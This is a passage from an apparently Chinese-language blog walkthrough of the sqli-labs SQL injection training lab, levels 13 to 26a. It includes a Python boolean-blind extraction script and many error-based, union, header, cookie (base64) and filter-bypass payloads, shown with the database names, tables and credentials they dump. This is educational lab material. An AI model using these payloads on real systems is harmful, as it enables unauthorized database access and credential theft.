class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br><span class="hljs-comment"># 网站路径</span><br>url = <span class="hljs-string">&quot;http://sqli-labs:8080/Less-13/&quot;</span><br><span class="hljs-comment"># 判断长度的payload</span><br>payload_len = <span class="hljs-string">&quot;&quot;&quot;a&#x27;) or length(</span><br><span class="hljs-string">    (database())</span><br><span class="hljs-string">) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br><span class="hljs-comment"># 枚举字符的payload</span><br>payload_str = <span class="hljs-string">&quot;&quot;&quot;a&#x27;) or ascii(</span><br><span class="hljs-string">    substr(</span><br><span class="hljs-string">        (database())</span><br><span class="hljs-string">    ,&#123;l&#125;,1)</span><br><span class="hljs-string">) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br> <br><span class="hljs-comment"># post请求参数</span><br>data= &#123;<br>    <span class="hljs-string">&quot;uname&quot;</span> : <span class="hljs-string">&quot;a&#x27;) or 1 -- a&quot;</span>,<br>    <span class="hljs-string">&quot;passwd&quot;</span> : <span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;submit&quot;</span> : <span class="hljs-string">&quot;Submit&quot;</span><br>&#125;<br> <br><span class="hljs-comment"># 判断长度</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getLen</span>(<span class="hljs-params">payload_len</span>):<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># 修改请求参数</span><br>        data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_len.<span class="hljs-built_in">format</span>(n = length)<br>        response = requests.post(url=url, data=data)<br>        <span class="hljs-comment"># 出现此内容为登录成功</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;测试成功，长度为：&#x27;</span>, length)<br>            <span class="hljs-keyword">return</span> length;<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在测试长度：&#x27;</span>, length)<br>            length += <span class="hljs-number">1</span><br> <br> <br><span class="hljs-comment"># 枚举字符</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getStr</span>(<span class="hljs-params">length</span>):<br>    <span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 从第一个字符开始截取</span><br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length+<span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># 枚举字符的每一种可能性</span><br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">126</span>):<br>            data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_str.<span class="hljs-built_in">format</span>(l=l, n=n)<br>            response = requests.post(url=url, data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                <span class="hljs-built_in">str</span> += <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;第&#x27;</span>, l, <span class="hljs-string">&#x27;个字符枚举成功：&#x27;</span>,<span class="hljs-built_in">str</span> )<br>                <span class="hljs-keyword">break</span><br> <br>length = getLen(payload_len)<br>getStr(length)<br></code></pre></td></tr></table></figure><p>其余脱库操作可以将<code>(database())</code>修改替换即可</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022012509.png"></p><h4 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14-&quot;"></a>Less-14-<code>&quot;</code></h4><p>和less-13一样，注入点改为<code>&quot;</code></p><h4 id="Less-15-‘-布尔盲注"><a href="#Less-15-‘-布尔盲注" class="headerlink" title="Less-15-‘-布尔盲注"></a>Less-15-‘-布尔盲注</h4><p>不显示数据库的报错信息，报错注入无法使用，不会动态返回数据，无法使用联合注入。</p><p>注入点判断：</p><p><code>admin&#39; -- </code></p><p>返回：<img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013661.png"></p><p><code>a&#39; or 1 -- a</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013095.png"></p><p><code>a&#39; or 0 -- a</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013815.png"></p><p>可以确定注入点为单引号字符型</p><p>布尔盲注参考Less-13-方法二</p><h4 id="Less-16-“-布尔盲注"><a href="#Less-16-“-布尔盲注" class="headerlink" title="Less-16-“)-布尔盲注"></a>Less-16-“)-布尔盲注</h4><p>判断注入点为<code>&quot;)</code>，接下来依旧是布尔盲注</p><h4 id="Less-17-‘-报错注入"><a href="#Less-17-‘-报错注入" class="headerlink" title="Less-17-‘-报错注入"></a>Less-17-‘-报错注入</h4><p>这一关在用户名处输入的都没有实际作用，只有输入正确的用户名后，会返回<code>SUCCESSFULLY UPDATED YOUR PASSWORD</code>,所以注入点应该在密码处。</p><p>输入：admin&#x2F;a’</p><p>返回报错：</p><p><code>You have an error in your SQL syntax; check the manual that corresponds to  your MySQL server version for the right syntax to use near &#39;admin&#39;&#39; at  line 1</code></p><p>存在单引号注入点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs plain">#判断报错条件<br><br>a&#x27; and updatexml(1,0x7e,3) -- a<br><br>##返回：XPATH syntax error: &#x27;~&#x27;<br><br><br><br>#脱库<br>##查询所有数据库名<br>##可以分段查询：<br>1&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),3) -- a<br>###返回：XPATH syntax error: &#x27;~information_schema&#x27;<br>1&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1)),3) -- a<br>###返回：XPATH syntax error: &#x27;~challenges&#x27;<br>1&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 5,1)),3) -- a<br>###返回：XPATH syntax error: &#x27;~security&#x27;<br><br>###直接查询当前所在库<br>1&#x27; and updatexml(1,concat(0x7e,substr((database()),1,32)),3) -- a<br>返回：XPATH syntax error: &#x27;~security&#x27;<br><br><br>#查询 security 数据库的所有表名<br>1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name)<br>from information_schema.tables<br>where table_schema=&quot;security&quot;)),3) -- a<br><br>##返回：XPATH syntax error: &#x27;~emails,referers,uagents,users&#x27;<br><br><br># 查询 users 表的所有列名<br>1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name)<br>from information_schema.columns<br>where table_schema=&quot;security&quot; and table_name=&quot;users&quot;)),3) -- a<br><br>##返回：XPATH syntax error: &#x27;~id,username,password&#x27;<br><br><br><br>#查表中内容（分段查询）：<br><br>1&#x27; and updatexml(1,concat(0x7e,(select concat(id,&#x27;:&#x27;,username,&#x27;:&#x27;,password) from security.users limit 0,1)),3) -- a<br>##返回：You can&#x27;t specify target table &#x27;users&#x27; for update in FROM clause&quot;你不能在 FROM 子句中指定目标表 &#x27;users&#x27; 进行更新&quot;<br><br>1&#x27; and updatexml(1,concat(0x7e,(select concat(id,&#x27;:&#x27;,username,&#x27;:&#x27;,password) from (select * from users) as temp limit 0,1)),3) -- a<br>##返回：XPATH syntax error: &#x27;~1:Dumb:0&#x27;<br>1&#x27; and updatexml(1,concat(0x7e,(select concat(id,&#x27;:&#x27;,username,&#x27;:&#x27;,password) from (select * from users) as temp limit 1,1)),3) -- a<br>##返回：XPATH syntax error: &#x27;~2:Angelina:0&#x27;<br></code></pre></td></tr></table></figure><h4 id="Less-18-HTTP头注入"><a href="#Less-18-HTTP头注入" class="headerlink" title="Less-18-HTTP头注入"></a>Less-18-HTTP头注入</h4><p>User-Agent:浏览器表明自己的身份（是哪种浏览器）</p><p>（由于php搭建的sqli-labs中18关修改User Agent后没有反应，所以这一关在buuctf打）</p><p>输入admin&#x2F;admin后，返回：</p><p><code>Your IP ADDRESS is: 10.244.166.11   Your User Agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0</code></p><p>而对用户名和密码处都没有出现报错，所以注入点应该在User Agent,bp抓包改。</p><p>推断uname 和 passwd 字段都进行了强效的过滤，我们注入正确的 uname 和 passwd 之后再注入。此时发现当注入单引号闭合时，网页返回报错信息。</p><p>User Agent：<code>&#39;</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013067.png"></p><p>注入 2 个连续的单引号，发现闭合成功，由此可见 2 个单引号分别闭合了 2 侧的单引号。</p><p>在注入的两个单引号之间可以插入其他 Sql 语句， updatexml() 报错注入语句。注意使用单引号闭合两侧的 Sql 语句时，相当于把它分割成了 2 部分，插入 updatexml() 报错时要用 OR 进行连接。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; OR updatexml(1,concat(&quot;!&quot;,database()),2) OR &#x27;</span> <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013780.png"></p><p>表名：’ OR updatexml(1,concat(“!”,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema &#x3D; ‘security’)),2) OR ‘ </p><p>字段名： ‘ OR updatexml(1,concat(“!”,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema &#x3D; ‘security’ AND table_name &#x3D; ‘users’)),2) OR ‘ </p><p>字段内容：’ OR (updatexml(1,concat(‘!’,(SELECT concat_ws(‘:’,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1)),1)) OR ‘ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013911.png"></p><h4 id="Less-19-Referer-POST-报错注入"><a href="#Less-19-Referer-POST-报错注入" class="headerlink" title="Less-19-Referer POST 报错注入"></a>Less-19-Referer POST 报错注入</h4><p>当输入正确的用户名和密码后，返回：</p><p><code>Your IP ADDRESS is: 10.244.166.11   Your Referer is: http://e6eb7525-01ea-457a-b00c-6fffbc2de320.node5.buuoj.cn/Less-19/</code></p><p><strong>Referer</strong>是 HTTP 头的一个字段，用于告诉服务器该网页是从哪个页面链接过来的。</p><p>数据库名：Referer: ‘ OR updatexml(1,concat(“!”,database()),2) OR ‘ </p><p>表名：Referer: ‘ OR updatexml(1,concat(“!”,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema &#x3D; ‘security’)),2) OR ‘ </p><p>字段名：Referer: ‘ OR updatexml(1,concat(“!”,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema &#x3D; ‘security’ AND table_name &#x3D; ‘users’)),2) OR ‘ </p><p>字段内容：Referer: ‘ OR (updatexml(1,concat(‘!’,(SELECT concat_ws(‘:’,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1)),1)) OR ‘ </p><h4 id="Less-20-Cookie"><a href="#Less-20-Cookie" class="headerlink" title="Less-20-Cookie"></a>Less-20-Cookie</h4><p><strong>cookie</strong> 是网站为了辨别用户身份，进行 Session 跟踪而储存在用户本地终端上的数据。想要回到登录页面，我们需要先把 cookie 清除掉。</p><p>首先输入正确的账户和密码测试，用bp抓包，抓到之后放行POST再抓GET，此时GET中会有cookie信息</p><p>此时就可以在cookie处进行测试注入</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013836.png"></p><p>闭合<br>　Cookie: uname&#x3D;admin’ </p><p>查询库名<br>Cookie: uname&#x3D;admin’ and updatexml(1,concat(1,database()),1) and ‘</p><p>查询表名<br>　Cookie: uname&#x3D;admin’ and updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’)),1) and ‘</p><p> 查询字段<br>　Cookie: uname&#x3D;admin’ and updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’)),1) and ‘</p><p> 查询数据<br>Cookie: uname&#x3D;admin’ and updatexml(1,concat(1,(select group_concat(username,’<del>‘,password) from users)),1) and ‘<br>Cookie: uname&#x3D;admin’ and updatexml(1,concat(1,(select concat(username,’</del>‘,password) from users limit 0,1)),1) and ‘</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013182.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022014352.png"></p><h4 id="Less-21-Cookie-base64-‘"><a href="#Less-21-Cookie-base64-‘" class="headerlink" title="Less-21-Cookie-base64-‘)"></a>Less-21-Cookie-base64-‘)</h4><p>这一关中的Cookie中uname参数的值是base64编码的。</p><p>抓包之后，<code>Cookie: uname=YWRtaW4%3D</code></p><p>把uname的值粘贴到burpsuite的decoder1（编码工具）模块，尝试解码，url, html, base64，可以看到最终结果是admin%3D</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022014872.png"></p><p>把admin’放到decoder里面, 编码成base64,重放器发回去</p><p>从报错可知闭合是’)</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022014836.png"></p><p> 这关还是可以用报错注入，除了<strong>每条payload都要经过一次base64编码（如果base64编码结果包含等号还要进行url编码），再作为uname的值发送</strong>，其他还是和Less20一样。</p><p>Cookie: uname&#x3D; YWRtaW4nKSM&#x3D;</p><p>admin’)#</p><p>Cookie: uname&#x3D;JykgVU5JT04gU0VMRUNUIDEsMiwzIw&#x3D;&#x3D;</p><p>‘) union select 1,2,3#</p><p>Cookie: uname&#x3D;JykgVU5JT04gU0VMRUNUIGRhdGFiYXNlKCksMiwzIw&#x3D;&#x3D;</p><p>‘) union select database(),2,3#</p><p>Cookie: uname&#x3D;JykgVU5JT04gU0VMRUNUIGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSwyLDMgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIFdIRVJFIHRhYmxlX3NjaGVtYSA9ICdzZWN1cml0eScj</p><p>‘) union select group_concat(table_name),2,3 from information_schema.tables where table_schema &#x3D; ‘security’#</p><p>Cookie: uname&#x3D;JykgVU5JT04gU0VMRUNUIGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSksMiwzIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgV0hFUkUgdGFibGVfc2NoZW1hID0gJ3NlY3VyaXR5JyBBTkQgdGFibGVfbmFtZSA9ICd1c2Vycycj</p><p>‘) union select group_concat(column_name),2,3 from information_schema.columns where table_schema &#x3D; ‘security’ and table_name &#x3D; ‘users’#</p><p>Cookie: dW5hbWU9JykgVU5JT04gU0VMRUNUIGdyb3VwX2NvbmNhdChjb25jYXQoIjoiLHVzZXJuYW1lLHBhc3N3b3JkKSksMiwzIEZST00gc2VjdXJpdHkudXNlcnMj</p><p>‘) union select group_concat(concat(“:”,username,password)),2,3 from security.users#</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022014093.png"></p><h4 id="Less-22-Cookie-base64-“"><a href="#Less-22-Cookie-base64-“" class="headerlink" title="Less-22-Cookie-base64-“"></a>Less-22-Cookie-base64-“</h4><p>原理和上一关一样一样的（注入点在cookie的uname参数值，payload需要base64编码，如果编码后有等号还需要url编码），就是闭合换成双引号了。</p><p>注入点变成”</p><p>Cookie: uname&#x3D; IiM&#x3D;</p><p>“ # </p><p>Cookie: uname&#x3D;YSIgdW5pb24gc2VsZWN0IDEsMiwzIw&#x3D;&#x3D;</p><p>a” union select 1,2,3#</p><p>Cookie: uname&#x3D; IiB1bmlvbiBzZWxlY3QgZGF0YWJhc2UoKSwyLDMj</p><p>“ union select database(),2,3#</p><p>Cookie: uname&#x3D; IiB1bmlvbiBzZWxlY3QgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpLDIsMyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hID0gJ3NlY3VyaXR5JyM&#x3D;</p><p>“ union select group_concat(table_name),2,3 from information_schema.tables where table_schema &#x3D; ‘security’#</p><p>Cookie: uname&#x3D; IiB1bmlvbiBzZWxlY3QgZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKSwyLDMgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9zY2hlbWEgPSAnc2VjdXJpdHknIGFuZCB0YWJsZV9uYW1lID0gJ3VzZXJzJyM&#x3D;</p><p>“ union select group_concat(column_name),2,3 from information_schema.columns where table_schema &#x3D; ‘security’ and table_name &#x3D; ‘users’#</p><p>Cookie: uname:&#x3D; IiB1bmlvbiBzZWxlY3QgZ3JvdXBfY29uY2F0KGNvbmNhdCgiOiIsdXNlcm5hbWUscGFzc3dvcmQpKSwyLDMgZnJvbSBzZWN1cml0eS51c2VycyM&#x3D;</p><p>“ union select group_concat(concat(“:”,username,password)),2,3 from security.users#</p><h4 id="Less-23-联合注入-过滤注释符"><a href="#Less-23-联合注入-过滤注释符" class="headerlink" title="Less-23-联合注入-过滤注释符"></a>Less-23-联合注入-过滤注释符</h4><p>?id&#x3D;1正常返回数据</p><p>?id&#x3D;1’<code>**Warning**:  mysql_fetch_array() expects parameter 1 to be resource, boolean given in **D:\CTF-Tools\phpstudy_pro\WWW\sqli-labs\Less-23\index.php** on line **38**    You have an error in your SQL syntax; check the  manual that corresponds to your MySQL server version for the right  syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1 </code>确定是单引号字符型</p><p>?id&#x3D;1’ or 1 –+ </p><p>?id&#x3D;1’ and 1&#x3D;1 –+</p><p>?id&#x3D;1’ and 1&#x3D;2 #都显示报错信息，应该是过滤了注释符</p><p>?id&#x3D;33’ union select 1,2,3’ 返回2，3</p><p>?id&#x3D;21’ union select 1,database(),3 and ‘</p><p>返回数据库名security</p><p>?id&#x3D;99’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’ ‘</p><p>返回：emails,referers,uagents,users</p><p>?id&#x3D;99’ union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’ ‘</p><p>返回：id,username,password</p><p>?id&#x3D;99’ union select 1,group_concat(concat_ws(‘:’,username,password)),3 from users where ‘1’ &#x3D; ‘1</p><p>返回：Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4</p><h4 id="Less-24-二次注入"><a href="#Less-24-二次注入" class="headerlink" title="Less-24-二次注入"></a>Less-24-二次注入</h4><p>先创建一个新的用户和密码，admin’#&#x2F;123456，使用这个用户登录后，输入admin&#x2F;111&#x2F;111更改密码，修改成功，之后使用admin&#x2F;111登录成功，夺取了用户admin</p><p>原理：</p><p><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;;</code></p><p>当输入admin’#时：</p><p><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39; &quot;;</code></p><p>sql语句就变成了：</p><p><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;#</code></p><p>此时，我们并不需要原密码进行验证，并且直接修改了其他用户的密码。这就是所谓的 <strong>二次注入</strong>，这种注入发生在用户提交的值被存储在数据库中，这个值可能被转义过。当这个值被其他模块调用时，会使用而不转义的原来的数据，如果这个数据是恶意注入，在不转义的情况下就会生效。</p><h4 id="Less-25-过滤or、and-双写注入"><a href="#Less-25-过滤or、and-双写注入" class="headerlink" title="Less-25-过滤or、and-双写注入"></a>Less-25-过滤or、and-双写注入</h4><p>这一关过滤了or和and </p><p>?id&#x3D;1’</p><p><strong>Warning</strong>:  mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>D:\CTF-Tools\phpstudy_pro\WWW\sqli-labs\Less-25\index.php</strong> on line <strong>37</strong><br> You have an error in your SQL syntax; check the  manual that corresponds to your MySQL server version for the right  syntax to use near ‘’1’’ LIMIT 0,1’ at line 1 </p><p>?id&#x3D;1”</p><p>  Your Login name:Dumb<br>Your Password:Dumb </p><p>确定为单引号字符型注入</p><p>可以使用双写注入</p><p>?id&#x3D;1’ OorR 1 &#x3D; 1–+</p><p>?id&#x3D;1’ aadnnd 1&#x3D;1 –+</p><p>这样就可以绕过过滤了</p><p>?id&#x3D;33’ union select 1,2,3’ 返回2，3</p><p>?id&#x3D;21’ union select 1,database(),3 and ‘</p><p>返回数据库名security</p><p>?id&#x3D;99’ union select 1,group_concat(table_name),3 from infoORrmation_schema.tables where table_schema&#x3D;’security’ ‘</p><p>返回：emails,referers,uagents,users</p><p>?id&#x3D;99’ union select 1,group_concat(column_name),3 from infoORrmation_schema.columns where table_schema&#x3D;’security’ aANDnd table_name&#x3D;’users’ ‘</p><p>返回：id,username,password</p><p>?id&#x3D;99’ union select 1,group_concat(concat_ws(‘:’,username,passwoORrd)),3 from users – +</p><p>返回：Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:456,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4,【rr:ee,admin#:111111,admin’#:111】（这些是Less-24写入的新用户名和密码）</p><h4 id="Less-25a-过滤or、and-双写注入-数字型"><a href="#Less-25a-过滤or、and-双写注入-数字型" class="headerlink" title="Less-25a-过滤or、and-双写注入-数字型"></a>Less-25a-过滤or、and-双写注入-数字型</h4><p>注入以下内容，以下内容全部网页都回显错误，说明该网页是数字型注入。</p><p>?id&#x3D;1’–+<br>?id&#x3D;1’)–+<br>?id&#x3D;1’))–+<br>?id&#x3D;1”–+<br>?id&#x3D;1”)–+</p><p>注入：?id&#x3D;1 OorR 1 &#x3D; 1–+返回正常</p><p>?id&#x3D;-1 union select 1,2,3’ 返回2，3</p><p>?id&#x3D;-1 union select 1,database(),3 and ‘</p><p>返回数据库名security</p><p>?id&#x3D;-1 union select 1,group_concat(table_name),3 from infoORrmation_schema.tables where table_schema&#x3D;’security’ ‘</p><p>返回：emails,referers,uagents,users</p><p>?id&#x3D;-1 union select 1,group_concat(column_name),3 from infoORrmation_schema.columns where table_schema&#x3D;’security’ aANDnd table_name&#x3D;’users’ ‘</p><p>返回：id,username,password</p><p>?id&#x3D;-1 union select 1,group_concat(concat_ws(‘:’,username,passwoORrd)),3 from users – +</p><p>返回：Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:456,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4,【rr:ee,admin#:111111,admin’#:111】（这些是Less-24写入的新用户名和密码）</p><h4 id="Less-26-过滤注释符和空格-报错注入"><a href="#Less-26-过滤注释符和空格-报错注入" class="headerlink" title="Less-26-过滤注释符和空格-报错注入"></a>Less-26-过滤注释符和空格-报错注入</h4><p>这一关过滤了注释符和空格，同时or、and也被过滤了</p><p>输入?id&#x3D;1’时报错，确定存在单引号字符型注入</p><p>对于被过滤的字符，可以使用其他的字符进行替代，使用 “%a0” 或 “%0b” 替代空格，使用 “||” 替代 “or”，使用 “%26%26” 替代 “and”。例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-1<span class="hljs-string">&#x27; || 1 = 1  || &#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; || updatexml(1,concat(0x7e,database()),1) || &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; || updatexml(1, concat(0x7e, (SELECT (group_concat(table_name)) FROM (infoorrmation_schema.tables) WHERE (table_schema=&#x27;</span>security<span class="hljs-string">&#x27;))) ,1) || &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;||updatexml(1,concat(1,(SELECT (group_concat(column_name)) FROM (infoorrmation_schema.columns) WHERE (table_schema=&#x27;</span>security<span class="hljs-string">&#x27; %26%26 table_name = &#x27;</span>users<span class="hljs-string">&#x27;))) ,1) || &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; || updatexml(1,concat(0x0a,(SELECT(group_concat(concat_ws(0x3a,username,passwoorrd))) FROM (security.users) WHERE (id = 1) ))  ,1) || &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="Less-26a-过滤注释符，空格-union注入"><a href="#Less-26a-过滤注释符，空格-union注入" class="headerlink" title="Less-26a-过滤注释符，空格-union注入"></a>Less-26a-过滤注释符，空格-union注入</h4><p>和less-26过滤的基本一样，但这一关没有给出报错信息，无法用报错注入。此处就需要使用 URL 编码来代替空格，然后用 UNION 注入。判断有几列可用，别忘了 “ORDER” 中的 “or” 被过滤掉了。</p><p>?id&#x3D;1’</p><p>?id&#x3D;1’)</p><p>?id&#x3D;1’) || (‘闭合成功</p><p>%a0空格</p><p>%27‘</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)%a0OorRDER%a0BY%a03||(&#x27;</span><span class="hljs-number">1</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">9999</span><span class="hljs-string">&#x27;)%a0UNION%a0SELECT%a01,2,3%a0||(&#x27;</span><span class="hljs-number">1</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">9999</span><span class="hljs-string">&#x27;)%a0UNION%a0SELECT%a01,database(),3%a0||(&#x27;</span><span class="hljs-number">1</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">9999</span><span class="hljs-string">&#x27;)%a0UNION%a0SELECT%a01,group_concat(table_name),3%a0FROM%a0infoORrmation_schema.tables%a0WHERE%a0table_schema = &#x27;</span>security<span class="hljs-string">&#x27;%a0||(&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)=(&#x27;</span><span class="hljs-number">2</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">9999</span><span class="hljs-string">&#x27;)%a0UNION%a0SELECT%a01,group_concat(column_name),3%a0FROM%a0infoORrmation_schema.columns%a0WHERE%a0table_schema=&#x27;</span>security<span class="hljs-string">&#x27;%a0AandND%a0table_name=&#x27;</span>users<span class="hljs-string">&#x27;%a0||(&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)=(&#x27;</span><span class="hljs-number">2</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">9999</span><span class="hljs-string">&#x27;)%a0UNION%a0SELECT%a01,group_concat(concat_ws(&quot;:&quot;,username,passwoORrd)),3%a0FROM%a0users%a0WHERE%a0(&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="Less-27-过滤union、select"><a href="#Less-27-过滤union、select" class="headerlink" 